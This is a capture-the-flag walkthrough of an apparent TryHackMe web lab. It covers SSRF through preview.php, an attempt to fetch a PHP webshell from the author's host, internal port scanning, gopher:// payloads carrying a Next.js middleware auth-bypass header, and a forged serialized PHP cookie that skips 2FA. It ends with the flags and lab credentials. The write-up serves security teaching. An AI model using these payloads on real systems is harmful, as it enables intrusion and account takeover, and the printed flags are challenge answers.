
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---

Let's visit the web application:

![Pasted image 20250915173532.png](../../IMAGES/Pasted%20image%2020250915173532.png)

Let's fuzz to begin:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u 'http://extract.thm/FUZZ' -ic -c -t 200 -e .php,.html,.js,.git,.json,.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://extract.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Extensions       : .php .html .js .git .json .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 1735, Words: 304, Lines: 65, Duration: 177ms]
index.php               [Status: 200, Size: 1735, Words: 304, Lines: 65, Duration: 177ms]
.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 175ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 176ms]
pdf                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 184ms]
management              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 175ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 176ms]
preview.php             [Status: 200, Size: 19, Words: 3, Lines: 1, Duration: 176ms]
```

We find some stuff here, if we go to `preview.php`, we find this:

![Pasted image 20250915173538.png](../../IMAGES/Pasted%20image%2020250915173538.png)

We need a `URL` parameter here, since we can fetch URLS, what if we try hosting a python server and checking if we can fetch assets that we host:

```
http://extract.thm/preview.php?url=http://10.14.21.28:8000/test.php
```

![Pasted image 20250915173542.png](../../IMAGES/Pasted%20image%2020250915173542.png)

As noticeable, the server tries to fetch our resource, since I don't have anything called `test.php` it returns 404, let's try a simple webshell and check the behavior:

```php
<?php system($_GET['cmd']); ?>
```

![Pasted image 20250915173547.png](../../IMAGES/Pasted%20image%2020250915173547.png)

It only previews the file but execution doesn't happen, we know we can preview files, what if we try internal resources then:

![Pasted image 20250915173553.png](../../IMAGES/Pasted%20image%2020250915173553.png)

Using `127.0.0.1` previews the main web page, this means that SSRF could be possible on the web application, let's try reading `/etc/passwd` using `file://`:

```
http://extract.thm/preview.php?url=file:///etc/passwd
```

![Pasted image 20250915173602.png](../../IMAGES/Pasted%20image%2020250915173602.png)

We get:

```
URL blocked due to keyword: file:/
```

File is filtered in order to avoid `SSRF`, let's begin exploitation in order to attempt bypassing this filter.


# FIRST FLAG
---

I tried some bypassing techniques on `file` in order to read the internal files but all of them failed, that's when I thought to fetch a resource we found fuzzing but couldn't access, if we try accessing the `management` resource, we get this:

![Pasted image 20250915173607.png](../../IMAGES/Pasted%20image%2020250915173607.png)

Access denied, what if we try through the SSRF:

![Pasted image 20250915173611.png](../../IMAGES/Pasted%20image%2020250915173611.png)

There we go, we can access the page, this is a login page but we don't have creds so no use, we can try bruteforce but we get nothing back, knowing that we can read internal resources, a good practice would be fuzzing for open ports on the target, you can either use caido or ffuf like I'd do:

```
seq 65535 > ports.txt

ffuf -w ports.txt -u 'http://extract.thm/preview.php?url=127.0.0.1:FUZZ' -ic -c -t 200 -fw 1
```

We get this:

![Pasted image 20250915173616.png](../../IMAGES/Pasted%20image%2020250915173616.png)

We found another open port `10000`, let's check it up:

![Pasted image 20250915173619.png](../../IMAGES/Pasted%20image%2020250915173619.png)

We get a warning and can also see an API, let's check, clicking the URL takes us to:

![Pasted image 20250915173628.png](../../IMAGES/Pasted%20image%2020250915173628.png)


We see `customapi`, going into it doesn't uncover anything, seems like we're unauthorized, checking the source code uncovers this is a `NextJs` app:

![Pasted image 20250915173639.png](../../IMAGES/Pasted%20image%2020250915173639.png)

Knowing this is a NextJs app, we can search for any exploit here, for example in the [Previous](https://www.hackthebox.com/machines/Previous) machine from HackTheBox, we worked with an authorization bypass in nextjs using an special header, take a look at this picture since I haven't released that writeup:

![Pasted image 20250915173644.png](../../IMAGES/Pasted%20image%2020250915173644.png)

Let's test if the same exploit works on this box:

https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/

![Pasted image 20250915173652.png](../../IMAGES/Pasted%20image%2020250915173652.png)

We still can't access the real API, that's because we need to send a gopher payload, gopher let us send raw TCP bytes (useful to craft exact HTTP requests or speak to non-HTTP services) via a `gopher://host:port/_<payload>` SSRF request. 

We can test it `gopher://` isn't filtered here:

![Pasted image 20250915173656.png](../../IMAGES/Pasted%20image%2020250915173656.png)

Nice, it is enabled and no filter here, now we need to craft a payload which will use our special bypass header and perform a GET request back to the API, you can ask AI help for the payload here, or you can use the following one

```gopher
http://extract.thm/preview.php?url=gopher%3A%2F%2F0.0.0.0%3A10000%2F_GET%2520%252Fcustomapi%2520HTTP%252F1.1%250D%250AHost%253A%25200.0.0.0%253A10000%250D%250AX-Middleware-Subrequest%253A%2520middleware%250D%250AConnection%253A%2520close%250D%250A%250D%250A
```

We can see this response:

![Pasted image 20250915173701.png](../../IMAGES/Pasted%20image%2020250915173701.png)

We get a different response, checking closely we find two important things:

![Pasted image 20250915173705.png](../../IMAGES/Pasted%20image%2020250915173705.png)

First flag:

```
THM{363bec60df12c2cadbe9ff35393fa468}
```

And credentials:

```
librarian / L1br4r1AN!!
```



# SECOND FLAG
---

Remember the login page we had before, let's test the credentials we found earlier:

![Pasted image 20250915173709.png](../../IMAGES/Pasted%20image%2020250915173709.png)

Same as before, we need to craft another gopher payload to be able to go through the login page, let's do it:

```
gopher://127.0.0.1:80/_POST%2520%2Fmanagement%2Findex.php%2520HTTP%2F1.1%250D%250AHost%3A%2520127.0.0.1%250D%250AContent-Type%3A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%3A%252043%250D%250AConnection%3A%2520close%250D%250A%250D%250Ausername%3Dlibrarian%26password%3DL1br4r1AN%252521%252521
```

We get this:

```HTTP
HTTP/1.1 200 OK
Date: Mon, 15 Sep 2025 22:21:17 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 512
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain;charset=UTF-8

HTTP/1.1 302 Found
Date: Mon, 15 Sep 2025 22:21:17 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=m6ns83qvk5o7osfsc97aioelk6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D; expires=Mon, 15 Sep 2025 23:21:17 GMT; Max-Age=3600; path=/
Location: 2fa.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

We get a redirection back to `2fa.php`, we can also see we got a `PHPSESSID` cookie and an auth token cookie too, let's use them and go to `2fa.php` using gopher too:

```
gopher://127.0.0.1:80/_GET%2520/management/2fa.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1%250D%250AConnection:%2520close%250D%250ACookie:%2520PHPSESSID=m6ns83qvk5o7osfsc97aioelk6;%2520auth_token=O%25253A9%25253A%252522AuthToken%252522%25253A1%25253A%25257Bs%25253A9%25253A%252522validated%252522%25253Bb%25253A0%25253B%25257D%250D%250A%250D%250A
```

![Pasted image 20250915173714.png](../../IMAGES/Pasted%20image%2020250915173714.png)

We get this response:

```http
HTTP/1.1 200 OK
Date: Mon, 15 Sep 2025 22:24:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1663
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain;charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 15 Sep 2025 22:24:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1361
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TryBookMe - 2FA Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #f8f9fa;
    }
    .box {
      max-width: 400px;
      margin: 60px auto;
      padding: 2rem;
      background-color: #fff;
      border-radius: 8px;
      border: 1px solid #dee2e6;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
    }
  </style>
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-dark bg-dark mb-4">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">🔐 2FA Verification</a>
  </div>
</nav>

<div class="container">
  <div class="box">
    <h4 class="text-center mb-4">Enter your 2FA code</h4>
    <form method="POST">
      <div class="mb-3">
        <label for="code" class="form-label">6-digit Code</label>
        <input type="text" id="code" name="code" maxlength="6" class="form-control" required>
      </div>
      <div class="d-grid">
        <button type="submit" class="btn btn-primary">Verify</button>
      </div>
    </form>
  </div>
</div>

<footer class="text-center mt-5 mb-3 text-muted">
  &copy; 2025 TryBookMe · All rights reserved
</footer>

</body>
</html>
```

The auth token is serialized, we know this by decoding the token:

```
Set-Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D; expires=Mon, 15 Sep 2025 23:21:17 GMT; Max-Age=3600; path=/


# After decoding
Set-Cookie: auth_token=O:9:"AuthToken":1:{s:9:"validated";b:0;}; expires=Mon, 15 Sep 2025 23:21:17 GMT; Max-Age=3600; path=/
```

If we change `b:0` to `b:1` and craft another gopher payload with this cookie, this happens:

```
# Make sure to replace your phpsessid, an AI like gemini does the job pretty well on this task

gopher://127.0.0.1:80/_GET%2520/management/2fa.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1%250D%250AConnection:%2520close%250D%250ACookie:%2520PHPSESSID=m6ns83qvk5o7osfsc97aioelk6;%2520auth_token=O%25253A9%25253A%252522AuthToken%252522%25253A1%25253A%25257Bs%25253A9%25253A%252522validated%252522%25253Bb%25253A1%25253B%25257D%250D%250A%250D%250A
```

![Pasted image 20250915173725.png](../../IMAGES/Pasted%20image%2020250915173725.png)

We get:

```http
HTTP/1.1 200 OK
Date: Mon, 15 Sep 2025 22:30:30 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 790
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain;charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 15 Sep 2025 22:30:30 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 489
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>2FA Complete - TryBookMe</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
  <div class="container py-5">
    <div class="alert alert-success text-center">
      <h4 class="alert-heading">Congratulations!</h4>
      <p>Here's the second flag: THM{804326748394ff9fb288e059653f0db7}</p>
    </div>
  </div>
</body>
</html>
```

We found the final flag and can finally end the CTF:

```
THM{363bec60df12c2cadbe9ff35393fa468}

THM{804326748394ff9fb288e059653f0db7}
```

![Pasted image 20250915173731.png](../../IMAGES/Pasted%20image%2020250915173731.png)               

